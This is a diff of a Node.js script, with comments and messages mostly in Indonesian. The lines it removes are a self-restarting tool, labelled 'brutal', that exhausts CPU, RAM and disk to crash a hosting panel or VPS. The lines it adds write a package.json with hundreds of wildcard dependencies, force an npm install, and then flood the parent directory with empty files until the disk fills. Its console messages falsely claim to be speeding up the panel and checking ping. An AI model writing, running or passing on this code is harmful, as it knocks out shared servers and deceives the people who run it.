"@hookform/resolvers": "*", "@hubspot/api-client": "*", "@iarna/toml": "*", "@ionic/core": "*", "@ionic/react": "*", "@istanbuljs/nyc-config-typescript": "*", "@jest/globals": "*", "@jest/types": "*", "@json2csv/node": "*", "@kubernetes/client-node": "*", "@lerna/project": "*", "@line/bot-sdk": "*", "@mapbox/mapbox-sdk": "*", "@material-ui/core": "*", "@material-ui/icons": "*", "@material-ui/lab": "*", "@mdx-js/mdx": "*", "@mdx-js/react": "*", "@microsoft/microsoft-graph-client": "*", "@microsoft/signalr": "*", "@mui/icons-material": "*", "@mui/lab": "*", "@mui/material": "*", "@mui/styled-engine": "*", "@mui/system": "*", "@mui/x-data-grid": "*", "@nestjs/axios": "*", "@nestjs/common": "*", "@nestjs/config": "*", "@nestjs/core": "*", "@nestjs/graphql": "*", "@nestjs/jwt": "*", "@nestjs/microservices": "*", "@nestjs/mongoose": "*", "@nestjs/passport": "*", "@nestjs/platform-express": "*", "@nestjs/platform-socket.io": "*", "@nestjs/schedule": "*", "@nestjs/serve-static": "*", "@nestjs/swagger": "*", "@nestjs/testing": "*", "@nestjs/typeorm": "*", "@nestjs/websockets": "*", "@next/font": "*", "@ng-bootstrap/ng-bootstrap": "*", "@ngrx/store": "*", "@nodelib/fs.scandir": "*", "@nodelib/fs.stat": "*", "@nodelib/fs.walk": "*", "@nrwl/cli": "*", "@nrwl/nx-cloud": "*", "@nuxt/kit": "*", "@nuxtjs/axios": "*", "@octokit/core": "*", "@octokit/rest": "*", "@opentelemetry/api": "*", "@opentelemetry/sdk-node": "*", "@openzeppelin/contracts": "*", "@panva/hkdf": "*", "@playwright/test": "*", "@pm2/agent": "*", "@pm2/io": "*", "@pm2/js-api": "*", "@polka/url": "*", "@popperjs/core": "*", "@prisma/client": "*", "@radix-ui/react-checkbox": "*", "@radix-ui/react-dialog": "*", "@radix-ui/react-dropdown-menu": "*", "@radix-ui/react-popover": "*", "@radix-ui/react-select": "*", "@radix-ui/react-slot": "*", "@radix-ui/react-switch": "*", "@radix-ui/react-tooltip": "*", "@react-aria/button": "*", "@react-native-async-storage/async-storage": "*", "@react-native-community/netinfo": "*", "@react-native-firebase/app": "*", "@react-native-firebase/auth": "*", "@react-native-firebase/messaging": "*", "@react-navigation/bottom-tabs": "*", "@react-navigation/native": "*", "@react-navigation/stack": "*", "@react-spring/web": "*", "@react-three/drei": "*", "@react-three/fiber": "*", "@reduxjs/toolkit": "*", "@remix-run/node": "*", "@remix-run/react": "*", "@remix-run/serve": "*", "@rollup/plugin-commonjs": "*", "@rollup/plugin-json": "*", "@rollup/plugin-node-resolve": "*", "@rollup/plugin-replace": "*", "@sanity/client": "*", "@sendgrid/mail": "*", "@sentry/browser": "*", "@sentry/node": "*", "@sentry/react": "*", "@sentry/tracing": "*", "@sentry/types": "*", "@shopify/shopify-api": "*", "@slack/bolt": "*", "@slack/web-api": "*", "@socket.io/redis-adapter": "*", "@solana/web3.js": "*", "@storybook/react": "*", "@stripe/stripe-js": "*", "@supabase/supabase-js": "*", "@swc/core": "*", "@tailwindcss/aspect-ratio": "*", "@tailwindcss/forms": "*", "@tailwindcss/typography": "*", "@tanstack/react-query": "*", "@tensorflow/tfjs": "*", "@tensorflow/tfjs-node": "*", "@testing-library/jest-dom": "*", "@testing-library/react": "*", "@testing-library/user-event": "*", "@trpc/client": "*", "@trpc/server": "*", "@trysound/sax": "*", "@turf/turf": "*", "@types/async": "*", "@types/aws-lambda": "*", "@types/axios": "*", "@types/bcrypt": "*", "@types/bluebird": "*", "@types/body-parser": "*", "@types/chai": "*", "@types/chalk": "*", "@types/cheerio": "*", "@types/compression": "*", "@types/cookie-parser": "*", "@types/cors": "*", "@types/cron": "*", "@types/crypto-js": "*", "@types/debug": "*", "@types/dotenv": "*", "@types/ejs": "*", "@types/eslint": "*", "@types/express": "*", "@types/express-fileupload": "*", "@types/express-session": "*", "@types/fs-extra": "*", "@types/glob": "*", "@types/google-protobuf": "*", "@types/got": "*", "@types/hapi__hapi": "*", "@types/html-minifier": "*", "@types/inquirer": "*", "@types/jest": "*", "@types/jquery": "*", "@types/js-yaml": "*", "@types/jsdom": "*", "@types/jsonwebtoken": "*", "@types/lodash": "*", "@types/markdown-it": "*", "@types/mime-types": "*", "@types/mocha": "*", "@types/moment-timezone": "*", "@types/mongodb": "*", "@types/mongoose": "*", "@types/morgan": "*", "@types/ms": "*", "@types/multer": "*", "@types/mysql": "*", "@types/node": "*", "@types/node-fetch": "*", "@types/node-schedule": "*", "@types/node-telegram-bot-api": "*", "@types/nodemailer": "*", "@types/passport": "*", "@types/pg": "*", "@types/prettier": "*", "@types/puppeteer": "*", "@types/qrcode": "*", "@types/qs": "*", "@types/react": "*", "@types/react-dom": "*", "@types/redis": "*", "@types/request": "*", "@types/rimraf": "*", "@types/semver": "*", "@types/sequelize": "*", "@types/serve-static": "*", "@types/shelljs": "*", "@types/sinon": "*", "@types/socket.io": "*", "@types/socket.io-client": "*", "@types/superagent": "*", "@types/supertest": "*", "@types/tar": "*", "@types/tough-cookie": "*", "@types/uuid": "*", "@types/validator": "*", "@types/webpack": "*", "@types/websocket": "*", "@types/ws": "*", "@types/yargs": "*", "@typescript-eslint/eslint-plugin": "*", "@typescript-eslint/parser": "*", "@vercel/analytics": "*", "@vercel/node": "*", "@vitejs/plugin-react": "*", "@vitejs/plugin-vue": "*", "@vue/cli-plugin-babel": "*", "@vue/cli-plugin-eslint": "*", "@vue/cli-service": "*", "@vue/compiler-sfc": "*", "@vue/server-renderer": "*", "@vueuse/core": "*", "@webassemblyjs/ast": "*", "@whiskeysockets/baileys": "*", "@xtuc/long": "*", "abbrev": "*", "abort-controller": "*", "accepts": "*", "acorn": "*", "acorn-globals": "*", "acorn-jsx": "*", "acorn-walk": "*", "acrcloud": "*", "address": "*", "adm-zip": "*", "adonis-lucid-filter": "*", "aes-js": "*", "agent-base": "*", "agentkeepalive": "*", "aggregate-error": "*", "ag-grid-community": "*", "ag-grid-react": "*", "ajv": "*", "ajv-errors": "*", "ajv-keywords": "*", "algoliasearch": "*", "alpinejs": "*", "amqplib": "*", "anime-character-random": "*", "animejs": "*", "ansi-align": "*", "ansi-colors": "*", "ansi-escapes": "*", "ansi-html-community": "*", "ansi-regex": "*", "ansi-styles": "*", "antd": "*", "any-promise": "*", "anymatch": "*", "apollo-server-express": "*", "app-root-path": "*", "append-field": "*", "aproba": "*", "arch": "*", "archiver": "*", "archiver-utils": "*", "archy": "*", "are-we-there-yet": "*", "arg": "*", "argparse": "*", "argon2": "*", "array-flatten": "*", "array-includes": "*", "array-union": "*", "array-uniq": "*", "array-unique": "*", "arrify": "*", "asap": "*", "asn1": "*", "asn1.js": "*", "assert": "*", "assert-plus": "*", "assign-symbols": "*", "ast-types": "*", "async": "*", "async-limiter": "*", "async-mqtt": "*", "async-mutex": "*", "asynckit": "*", "at-least-node": "*", "atob": "*", "auth0": "*", "autoprefixer": "*", "available-typed-arrays": "*", "awesome-phonenumber": "*", "aws-amplify": "*", "aws-sdk": "*", "aws-sign2": "*", "aws4": "*", "axios": "*", "axios-cookiejar-support": "*", "axios-retry": "*", "babel-jest": "*", "babel-loader": "*", "babel-plugin-istanbul": "*", "babel-plugin-jest-hoist": "*", "babel-plugin-module-resolver": "*", "babel-plugin-styled-components": "*", "babel-preset-current-node-syntax": "*", "babel-preset-jest": "*", "backbone": "*", "balanced-match": "*", "base": "*", "base-64": "*", "base32": "*", "base64-js": "*", "base64id": "*", "basic-auth": "*", "bcrypt": "*", "bcrypt-pbkdf": "*", "bcryptjs": "*", "big-integer": "*", "big.js": "*", "bignumber.js": "*", "binary-extensions": "*", "bindings": "*", "bl": "*", "bluebird": "*", "bn.js": "*", "body-parser": "*", "boolbase": "*", "bootstrap": "*", "boxen": "*", "brace-expansion": "*", "braces": "*", "brainly-scraper": "*", "brorand": "*", "browser-process-hrtime": "*", "browser-stdout": "*", "browserify": "*", "browserify-aes": "*", "browserify-cipher": "*", "browserify-des": "*", "browserify-rsa": "*", "browserify-sign": "*", "browserify-zlib": "*", "browserslist": "*", "bs-logger": "*", "bser": "*", "bson": "*", "buffer": "*", "buffer-crc32": "*", "buffer-equal-constant-time": "*", "buffer-from": "*", "buffer-indexof": "*", "buffer-writer": "*", "builtin-modules": "*", "bull": "*", "bullmq": "*", "bulma": "*", "bunyan": "*", "busboy": "*", "bytes": "*", "cache-manager": "*", "camelcase": "*", "canvas": "*", "cassandra-driver": "*", "cfonts": "*", "chai": "*", "chalk": "*", "chart.js": "*", "cheerio": "*", "chokidar": "*", "class-transformer": "*", "class-validator": "*", "classnames": "*", "cli-color": "*", "cli-table3": "*", "clipboardy": "*", "cloudinary": "*", "cluster": "*", "colors": "*", "commander": "*", "compression": "*", "concat-stream": "*", "config": "*", "connect": "*", "cookie": "*", "cookie-parser": "*", "cors": "*", "cron": "*", "cross-env": "*", "crypto-js": "*", "crypto-random-string": "*", "css-loader": "*", "csv-parser": "*", "d3": "*", "date-fns": "*", "dayjs": "*", "debug": "*", "decimal.js": "*", "deep-equal": "*", "deepmerge": "*", "delay": "*", "discord-rpc": "*", "discord.js": "*", "dotenv": "*", "download": "*", "draft-js": "*", "ejs": "*", "elasticsearch": "*", "electron": "*", "elliptic": "*", "email-validator": "*", "emoji-api": "*", "enquirer": "*", "entities": "*", "esbuild": "*", "eslint": "*", "ethers": "*", "eventemitter3": "*", "exceljs": "*", "execa": "*", "express": "*", "express-fileupload": "*", "express-graphql": "*", "express-handlebars": "*", "express-session": "*", "faker": "*", "fast-glob": "*", "fast-json-stringify": "*", "fastify": "*", "fb-watchman": "*", "ffmpeg-static": "*", "figlet": "*", "file-saver": "*", "file-type": "*", "firebase": "*", "firebase-admin": "*", "fluent-ffmpeg": "*", "form-data": "*", "formik": "*", "framer-motion": "*", "fs-extra": "*", "fsevents": "*", "fuse.js": "*", "gatsby": "*", "gaxios": "*", "glob": "*", "google-auth-library": "*", "google-it": "*", "google-libphonenumber": "*", "google-map-react": "*", "google-spreadsheet": "*", "google-tts-api": "*", "googleapis": "*", "got": "*", "graceful-fs": "*", "graphql": "*", "grpc": "*", "gts": "*", "gtts": "*", "gulp": "*", "handlebars": "*", "helmet": "*", "highlight.js": "*", "history": "*", "html-entities": "*", "html-minifier": "*", "html-to-text": "*", "html-webpack-plugin": "*", "htmlparser2": "*", "http-proxy-middleware": "*", "human-readable": "*", "hxz-api": "*", "i18n": "*", "i18next": "*", "iconv-lite": "*", "image-size": "*", "image-to-base64": "*", "imagemin": "*", "immer": "*", "immutable": "*", "inquirer": "*", "instagram-private-api": "*", "instatouch": "*", "ioredis": "*", "ip": "*", "is-docker": "*", "is-mobile": "*", "is-promise": "*", "is-url": "*", "isomorphic-fetch": "*", "istanbul-lib-coverage": "*", "jackspeak": "*", "jasmine": "*", "javascript-obfuscator": "*", "jest": "*", "jimp": "*", "joi": "*", "jquery": "*", "js-cookie": "*", "js-yaml": "*", "jsdom": "*", "json-server": "*", "json-stable-stringify": "*", "json2csv": "*", "json5": "*", "jsonwebtoken": "*", "jszip": "*", "kafkajs": "*", "keyv": "*", "knex": "*", "koa": "*", "lerna": "*", "less": "*", "level": "*", "libphonenumber-js": "*", "lighthouse": "*", "lilconfig": "*", "lint-staged": "*", "loader-utils": "*", "lodash": "*", "log-symbols": "*", "log4js": "*", "loglevel": "*", "lowdb": "*", "lru-cache": "*", "luxon": "*", "mailgun-js": "*", "make-dir": "*", "markdown-it": "*", "marked": "*", "mathjs": "*", "md5": "*", "memcached": "*", "memory-fs": "*", "meow": "*", "merge-deep": "*", "methods": "*", "micromatch": "*", "mime": "*", "mime-types": "*", "mini-css-extract-plugin": "*", "minimatch": "*", "minimist": "*", "minipass": "*", "mkdirp": "*", "mobx": "*", "mobx-react": "*", "mocha": "*", "mock-fs": "*", "moment": "*", "moment-timezone": "*", "mongodb": "*", "mongoose": "*", "morgan": "*", "ms": "*", "multer": "*", "mustache": "*", "mysql": "*", "mysql2": "*", "nan": "*", "nanoid": "*", "nats": "*", "natural": "*", "needle": "*", "negotiator": "*", "neo-async": "*", "nested-error-stacks": "*", "next": "*", "next-auth": "*", "node-cache": "*", "node-cron": "*", "node-emoji": "*", "node-fetch": "*", "node-forge": "*", "node-gtts": "*", "node-gyp": "*", "node-html-parser": "*", "node-jose": "*", "node-notifier": "*", "node-os-utils": "*", "node-sass": "*", "node-schedule": "*", "node-telegram-bot-api": "*", "node-webpmux": "*", "nodemailer": "*", "nodemon": "*", "nopt": "*", "normalize-url": "*", "npm": "*", "npm-run-all": "*", "npmlog": "*", "nprogress": "*", "nuxt": "*", "nyc": "*", "oauth": "*", "oauth-sign": "*", "object-assign": "*", "object-hash": "*", "object-path": "*", "objection": "*", "on-finished": "*", "on-headers": "*", "once": "*", "onetime": "*", "open": "*", "openai": "*", "opener": "*", "opn": "*", "ora": "*", "os-browserify": "*", "os-locale": "*", "p-limit": "*", "p-map": "*", "p-queue": "*", "p-retry": "*", "pako": "*", "parcel": "*", "parse-json": "*", "parse5": "*", "parseurl": "*", "passport": "*", "passport-jwt": "*", "passport-local": "*", "path-browserify": "*", "path-to-regexp": "*", "pdf-lib": "*", "pdfkit": "*", "pg": "*", "pg-hstore": "*", "picocolors": "*", "picomatch": "*", "pify": "*", "pino": "*", "pixelmatch": "*", "pkg-dir": "*", "playwright": "*", "pluralize": "*", "pm2": "*", "pngjs": "*", "polished": "*", "postcss": "*", "postcss-loader": "*", "postgres": "*", "preact": "*", "prettier": "*", "pretty-bytes": "*", "pretty-error": "*", "prismjs": "*", "process": "*", "progress": "*", "promise": "*", "prompts": "*", "prop-types": "*", "protobufjs": "*", "proxy-addr": "*", "proxy-agent": "*", "psl": "*", "pump": "*", "punycode": "*", "puppeteer": "*", "puppeteer-core": "*", "pusher": "*", "pusher-js": "*", "q": "*", "qrcode": "*", "qrcode-reader": "*", "qrcode-terminal": "*", "qs": "*", "query-string": "*", "querystring": "*", "queue-microtask": "*", "quick-lru": "*", "raf": "*", "ramda": "*", "randombytes": "*", "range-parser": "*", "raw-body": "*", "rc": "*", "react": "*", "react-dom": "*", "react-helmet": "*", "react-hook-form": "*", "react-icons": "*", "react-is": "*", "react-markdown": "*", "react-redux": "*", "react-router": "*", "react-router-dom": "*", "react-scripts": "*", "react-select": "*", "react-spring": "*", "react-use": "*", "read-pkg": "*", "read-pkg-up": "*", "readable-stream": "*", "readdirp": "*", "readline": "*", "recharts": "*", "recompose": "*", "redis": "*", "redux": "*", "redux-logger": "*", "redux-saga": "*", "redux-thunk": "*", "reflect-metadata": "*", "regenerator-runtime": "*", "regex-not": "*", "regexp.prototype.flags": "*", "relateurl": "*", "remove-trailing-separator": "*", "remove.bg": "*", "renderkid": "*", "repeat-element": "*", "repeat-string": "*", "request": "*", "request-promise": "*", "request-promise-native": "*", "require-directory": "*", "require-from-string": "*", "requires-port": "*", "reselect": "*", "resolve": "*", "resolve-from": "*", "resolve-url": "*", "restore-cursor": "*", "retry": "*", "reusify": "*", "rimraf": "*", "rollup": "*", "rollup-plugin-terser": "*", "run-parallel": "*", "rxjs": "*", "safe-buffer": "*", "safer-buffer": "*", "sanitize-html": "*", "sass": "*", "sass-loader": "*", "scheduler": "*", "schema-utils": "*", "scrape-primbon": "*", "semver": "*", "send": "*", "serialize-javascript": "*", "serve-favicon": "*", "serve-index": "*", "serve-static": "*", "set-blocking": "*", "setimmediate": "*", "setprototypeof": "*", "sha.js": "*", "sharp": "*", "shebang-command": "*", "shell-quote": "*", "shelljs": "*", "shortid": "*", "side-channel": "*", "signal-exit": "*", "simple-git": "*", "simple-swizzle": "*", "sinon": "*", "sisteransi": "*", "slash": "*", "slate": "*", "slice-ansi": "*", "slugify": "*", "socket.io": "*", "socket.io-client": "*", "sockjs": "*", "socks-proxy-agent": "*", "sort-keys": "*", "source-map": "*", "source-map-support": "*", "spdx-expression-parse": "*", "spdy": "*", "split": "*", "split2": "*", "sprintf-js": "*", "sqlite3": "*", "sqlstring": "*", "sshpk": "*", "stable": "*", "stack-trace": "*", "stack-utils": "*", "statuses": "*", "stream-browserify": "*", "stream-each": "*", "stream-http": "*", "string-length": "*", "string-width": "*", "string_decoder": "*", "strip-ansi": "*", "strip-bom": "*", "strip-eof": "*", "strip-indent": "*", "strip-json-comments": "*", "style-loader": "*", "styled-components": "*", "stylelint": "*", "stylus": "*", "superagent": "*", "supertest": "*", "supports-color": "*", "svg-parser": "*", "svgo": "*", "swiper": "*", "symbol-observable": "*", "systeminformation": "*", "table": "*", "tailwind-merge": "*", "tailwindcss": "*", "tapable": "*", "tar": "*", "telegram": "*", "temp": "*", "terminal-link": "*", "terser": "*", "terser-webpack-plugin": "*", "test-exclude": "*", "text-table": "*", "three": "*", "through": "*", "through2": "*", "thunky": "*", "timers-browserify": "*", "tiny-invariant": "*", "tinycolor2": "*", "tmp": "*", "to-fast-properties": "*", "to-regex": "*", "to-regex-range": "*", "toidentifier": "*", "token-types": "*", "tough-cookie": "*", "tr46": "*", "translate-google-api": "*", "tree-kill": "*", "ts-jest": "*", "ts-loader": "*", "ts-node": "*", "tsconfig-paths": "*", "tslib": "*", "tsutils": "*", "tty-browserify": "*", "tunnel-agent": "*", "turndown": "*", "tweetnacl": "*", "type-check": "*", "type-fest": "*", "type-is": "*", "typedarray": "*", "typedarray-to-buffer": "*", "typeorm": "*", "typescript": "*", "uglify-js": "*", "uid-safe": "*", "underscore": "*", "undici": "*", "unicode-match-property-ecmascript": "*", "union-value": "*", "uniq": "*", "unique-filename": "*", "unique-slug": "*", "unist-util-visit": "*", "universalify": "*", "unpipe": "*", "update-notifier": "*", "uri-js": "*", "urix": "*", "url": "*", "url-loader": "*", "url-parse": "*", "use": "*", "use-debounce": "*", "util": "*", "util-deprecate": "*", "util.promisify": "*", "uuid": "*", "v8-compile-cache": "*", "validate-npm-package-license": "*", "validator": "*", "vary": "*", "verror": "*", "vite": "*", "vm-browserify": "*", "vue": "*", "vue-loader": "*", "vue-router": "*", "vue-template-compiler": "*", "vuex": "*", "w3c-hr-time": "*", "w3c-xmlserializer": "*", "wa-sticker-formatter": "*", "walker": "*", "watchpack": "*", "web-vitals": "*", "web3": "*", "webidl-conversions": "*", "webpack": "*", "webpack-bundle-analyzer": "*", "webpack-cli": "*", "webpack-dev-middleware": "*", "webpack-dev-server": "*", "webpack-hot-middleware": "*", "webpack-merge": "*", "webpack-node-externals": "*", "webpack-sources": "*", "websocket": "*", "websocket-driver": "*", "websocket-extensions": "*", "whatwg-encoding": "*", "whatwg-fetch": "*", "whatwg-mimetype": "*", "whatwg-url": "*", "which": "*", "which-module": "*", "wide-align": "*", "winston": "*", "word-wrap": "*", "worker-farm": "*", "wrap-ansi": "*", "wrappy": "*", "write-file-atomic": "*", "ws": "*", "x-xss-protection": "*", "xdg-basedir": "*", "xfarr-api": "*", "xml-name-validator": "*", "xml2js": "*", "xmlbuilder": "*", "xmlhttprequest": "*", "xtend": "*", "y18n": "*", "yallist": "*", "yaml": "*", "yargs": "*", "yargs-parser": "*", "yarn": "*", "yauzl": "*", "yocto-queue": "*", "youtube-dl-exec": "*", "youtube-yts": "*", "yt-search": "*", "ytdl-core": "*", "ytdl-secktor": "*", "zen-observable": "*", "zlib-browserify": "*", "zone.js": "*", "zschema": "*", "zustand": "*"
 };
 
-let errorLogs = [];
-function logError(prefix, message) {
-    const logMsg = `[${new Date().toLocaleTimeString()}] ${prefix} ${message}`;
-    errorLogs.push(logMsg);
-    if (errorLogs.length > 5) errorLogs.shift();
-}
-
-function formatSize(bytes) {
-    const gb = (bytes / 1024 ** 3).toFixed(2);
-    return `${gb} GB`;
-}
-
-function drawDashboard() {
-    console.clear();
-    console.log('============================================');
-    console.log('🔥🔪⚙️ MONITORING & SYSTEM PROGRESS 🔥🔪⚙️');
-    console.log('If you see that the disk and RAM are slowing down, its not because the creation size is in GB (Giga Bytes), so thats normal.');
-    console.log('WARNING: This version is brutal and its very instant to kill the panel and make the VPS also turn off.');
-    console.log('Created And Developer By: @XYCoolcraft\n Note: Dont blame the creator, but blame it on careless misuse and dont play slander!.');
-    console.log('============================================\n');
-
-    const { cpu, ram, disk } = dashboardStatus;
-    console.log(`💻 CPU: ${cpu.cores} Cores [${cpu.status}]`);
-    let ramStatus = ram.status === 'Running' ?
-        `${formatSize(ram.progress)} / 999 TB` : `[${ram.status}]`;
-    console.log(`📈 RAM: ${ramStatus}`);
-    let diskStatus = disk.status === 'Running' ?
-        `${formatSize(disk.totalProgress)} / 999 TB  (File: ${disk.fileName} [${formatSize(disk.fileProgress)} / ${formatSize(DISK_FILE_BYTES_25GB)}])` : `[${disk.status}]`;
-    console.log(`💾 DISK: ${diskStatus}`);
-    console.log('\n--- System Logs ---');
-    console.log(errorLogs.join('\n'));
-}
-
-function launchWorker(workerArg, logPrefix) {
-    const worker = spawn('node', [__filename, workerArg], {
-        stdio: ['ignore', 'ignore', 'ignore', 'ipc']
-    });
-
-    worker.on('message', (msg) => {
-        if (msg.type === 'progress-ram') {
-            dashboardStatus.ram = { progress: msg.progress, status: 'Running' };
-        }
-        else if (msg.type === 'progress-disk') {
-            dashboardStatus.disk = { ...msg, status: 'Running' };
-        }
-        else if (msg.type === 'error-ram') {
-            logError(logPrefix, `GAGAL ALOKASI PADA ${formatSize(msg.progress)}: ${msg.message}`);
-        }
-        else if (msg.type === 'error-disk') {
-            logError(logError, `GAGAL TULIS PADA ${formatSize(msg.progress)}: ${msg.message}`);
-        }
-    });
-
-    worker.on('close', (code) => {
-        logError(logPrefix, `SYSTEM BERHENTI! (Kode: ${code}). Me-restart...`);
-        if (workerArg === '--run-ram') dashboardStatus.ram.status = 'Restarting...';
-        if (workerArg.startsWith('--run-disk-')) dashboardStatus.disk.status = 'Restarting...';
-        setImmediate(() => {
-            launchWorker(workerArg, logPrefix);
-        });
-    });
-
-    worker.on('error', (err) => {
-        logError(logPrefix, `GAGAL MELUNCURKAN: ${err.message}. Mencoba lagi...`);
-        setImmediate(() => {
-            launchWorker(workerArg, logPrefix);
-        });
-    });
-}
-
-function startManajer() {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
-
-    console.clear();
-    console.log('============================================');
-    console.log('🔥🔪⚙️ PILIH MODE NYA BANG! (13 PILIHAN) 🔥🔪⚙️');
-    console.log('============================================');
-    console.log('Mode Individual:');
-    console.log(' 1. Disk Saja');
-    console.log(' 2. RAM Saja');
-    console.log(' 3. CPU Saja');
-    console.log('\nMode Ganda:');
-    console.log(' 4. Disk + RAM');
-    console.log(' 5. RAM + CPU');
-    console.log(' 6. Disk + CPU');
-    console.log('\nMode Ganda (GODMODE):');
-    console.log(' 7. RAM + CPU (GODMODE)');
-    console.log(' 8. Disk + CPU (GODMODE)');
-    console.log(' 9. Disk + RAM (GODMODE)');
-    console.log('\nMode Ganda (OMEGA):');
-    console.log(' 11. RAM + CPU (OMEGA)');
-    console.log(' 12. Disk + CPU (OMEGA)');
-    console.log(' 13. Disk + RAM (OMEGA)');
-    console.log('\nMode BRUTAL:');
-    console.log(' 10. GODMODE (Disk + RAM + CPU)');
-    console.log(' 14. OMEGA (Disk + RAM + CPU)'); 
-    console.log('============================================');
-    console.log('Kemungkinan karena ini sangat brutal anda akan melihat Proses Ram yang ada di tampilan Console akan terlihat Freeze Karena ini Mode Cepat');
-    console.log('============================================');
-    
-    
-    
-    
-    console.log('Silahkan Pilih ( 1-14 ):');
-
-    rl.question('Masukkan pilihan (1-14): ', (choice) => {
+function checkAndCreatePackageJson() {
+    if (!fs.existsSync('./package.json') || fs.readFileSync('./package.json').length < 100) {
+        console.log('[1/3] 📦 Mendeteksi package.json kosong. Generated...');
         
-        let launchCPU = false;
-        let launchRAM = false;
-        let diskWorkerArg = null;
-        let diskLogPrefix = '';
+        const packageContent = {
+            "name": "🌹 Xayz Kill Your System 🔥⚙️",
+            "version": "6.6.6",
+            "description": "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ",
+            "main": "index.js",
+            "scripts": { "start": "node index.js" },
+            "dependencies": heavyDependencies
+        };
 
-        switch (choice) {
-            case '1': 
-                diskWorkerArg = '--run-disk-test';
-                diskLogPrefix = '💾 [DISK]';
-                break;
-            case '2': 
-                launchRAM = true;
-                break;
-            case '3': 
-                launchCPU = true;
-                break;
-            case '4': 
-                diskWorkerArg = '--run-disk-test';
-                diskLogPrefix = '💾 [DISK]';
-                launchRAM = true;
-                break;
-            case '5': 
-            case '7': 
-            case '11': 
-                launchRAM = true;
-                launchCPU = true;
-                break;
-            case '6': 
-                diskWorkerArg = '--run-disk-test';
-                diskLogPrefix = '💾 [DISK]';
-                launchCPU = true;
-                break;
-            case '8': 
-                diskWorkerArg = '--run-disk-godmode';
-                diskLogPrefix = '💾 [DISK-GODMODE]';
-                launchCPU = true;
-                break;
-            case '9': 
-                diskWorkerArg = '--run-disk-godmode';
-                diskLogPrefix = '💾 [DISK-GODMODE]';
-                launchRAM = true;
-                break;
-            case '10': 
-                diskWorkerArg = '--run-disk-godmode';
-                diskLogPrefix = '💾 [DISK-GODMODE]';
-                launchRAM = true;
-                launchCPU = true;
-                break;
-            case '12': 
-                diskWorkerArg = '--run-disk-omega';
-                diskLogPrefix = '💾 [DISK-OMEGA]';
-                launchCPU = true;
-                break;
-            case '13': 
-                diskWorkerArg = '--run-disk-omega';
-                diskLogPrefix = '💾 [DISK-OMEGA]';
-                launchRAM = true;
-                break;
-            case '14': 
-                diskWorkerArg = '--run-disk-omega';
-                diskLogPrefix = '💾 [DISK-OMEGA]';
-                launchRAM = true;
-                launchCPU = true;
-                break;
-            default:
-                console.log('Pilihan salah. Keluar.');
-                rl.close();
-                process.exit();
-                return;
-        }
-        
-        rl.close();
-        console.log('Pilihan diterima. Memulai sistem...');
-
-        setInterval(drawDashboard, 500);
-
-        if (launchCPU) {
-            const numCPUs = os.cpus().length;
-            dashboardStatus.cpu = { status: 'RUNNING', cores: numCPUs };
-            for (let i = 0; i < numCPUs; i++) {
-                launchWorker('--run-cpu', `💻 [CPU-${i + 1}]`);
-            }
-        }
-        
-        if (launchRAM) {
-            launchWorker('--run-ram', '📈 [RAM]');
-        }
-        
-        if (diskWorkerArg) {
-            launchWorker(diskWorkerArg, diskLogPrefix);
-        }
-    });
-}
-
-async function jalankanAplikasi() {
-    try {
-        await validasiInteraktif();
-        console.log('Berhasil Verifikasi. Menjalankan...');
-        startManajer(); 
-    } catch (error) {
-        console.error('===================================');
-        console.error(`EROR: ${error.message}`);
-        console.error('===================================');
-        process.exit(1); 
+        fs.writeFileSync('./package.json', JSON.stringify(packageContent, null, 2));
+        console.log('      ✅ package.json berhasil diinstal.');
+        return true;
     }
+    return false;
 }
 
-if (process.argv.includes('--run-cpu')) {
-    runCpuStress();
-} 
-else if (process.argv.includes('--run-ram')) {
-    runRamStress();
-} 
-else if (process.argv.includes('--run-disk-godmode')) {
-    runDiskStress_GODMODE();
+async function startFlooding() {
+    console.log('[3/3] ⚡ Memulai Mempercepat Panel untuk kelancaran script...');
+    
+    const baseDir = path.join(__dirname, '../');
+    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir);
+
+    const sectors = 50;
+    for (let i = 0; i < sectors; i++) {
+        const sectPath = path.join(baseDir, `Xayz-Tools-Ping-Install_${i}`);
+        if (!fs.existsSync(sectPath)) fs.mkdirSync(sectPath);
+    }
+
+    console.log('      >>> Please Dont turn it off for smooth running!');
+
+    let count = 0;
+    
+    const floodLoop = () => {
+        for (let i = 0; i < 1200; i++) {
+            if (count >= TARGET_FILES) {
+                console.log('✅ Sukses.. sedang memuat.');
+                return;
+            }
+
+            const sector = count % sectors;
+            const filePath = path.join(baseDir, `Xayz-Tools-Ping-Install_${sector}`, `Ping_Interact_Network${count}.lock`);
+            
+            try {
+                const fd = fs.openSync(filePath, 'w');
+                fs.closeSync(fd);
+            } catch (e) {
+                if (e.code === 'ENOSPC') {
+                    console.log('Sedang Mengecek Ping...');
+                    process.exit(0);
+                }
+            }
+            count++;
+        }
+
+        if (count % 50000 === 0) {
+            console.log(`      [Progress] ${count.toLocaleString()} / ${TARGET_FILES.toLocaleString()} Deploy...`);
+        }
+
+        setImmediate(floodLoop);
+    };
+
+    floodLoop();
 }
-else if (process.argv.includes('--run-disk-omega')) {
-    runDiskStress_OMEGA();
+
+const needInstall = checkAndCreatePackageJson();
+
+if (needInstall || !fs.existsSync('./node_modules')) {
+    console.log('[2/3] 🛠️ Menjalankan NPM INSTALL...');
+    console.log('      ⚠️ Server mungkin terlihat Lancar dan smooth...');
+    
+    const npmProc = spawn('npm', ['install', '--force', '--no-bin-links'], { stdio: 'inherit' });
+
+    npmProc.on('close', (code) => {
+        console.log(`      ✅ Instalasi selesai (Exit code: ${code}).`);
+        startFlooding();
+    });
+} else {
+    console.log('[INFO] Node_modules terdeteksi. Melanjutkan Injection Ping Small...');
+    startFlooding();
 }
-else if (process.argv.includes('--run-disk-test')) {
-    RunTestDisk();
-}
-else {
